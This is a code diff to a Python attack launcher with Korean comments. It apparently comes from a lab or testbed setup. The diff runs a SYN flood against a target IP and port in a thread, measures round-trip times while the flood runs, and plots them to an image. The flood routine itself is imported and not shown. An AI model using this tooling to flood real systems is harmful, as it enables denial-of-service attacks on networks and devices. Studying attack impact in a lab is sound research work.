@@ -2,6 +2,7 @@ from attacks import *
 import random
 from time import sleep
 import os
+import threading
 
 
 # todo: port scan 시 특정 포트들만 스캔하고 싶다면 아래 open_ports 리스트 활성화 & 포트 기재
@@ -77,7 +78,20 @@ def launch_attack(selection, target_ip, intensity=None):
             port = random.choice(open_ports[target_ip])  # 기기별 열린 포트 중 하나 선택
         else:
             port = random.randrange(1, 65536)   # 열린 포트 정보가 없다면 랜덤 지정
-        syn_flood(target_ip, port, pps, count)
+        
+        t1 = ThreadWithReturnValue(target=calc_flooding_intensity, args=(time,))
+        t2 = threading.Thread(target=syn_flood, args=(target_ip, port, pps, count))
+        t1.start()
+        # starting thread 2
+        t2.start()
+    
+        # wait until thread 1 is completely executed
+        rtt=t1.join()
+        # wait until thread 2 is completely executed
+        t2.join()
+        plt.plot(rtt)
+        plt.savefig("pings.png")
+        
 
     elif selection == 6:
         # target_ip = '192.168.10.23'     # some telnet server
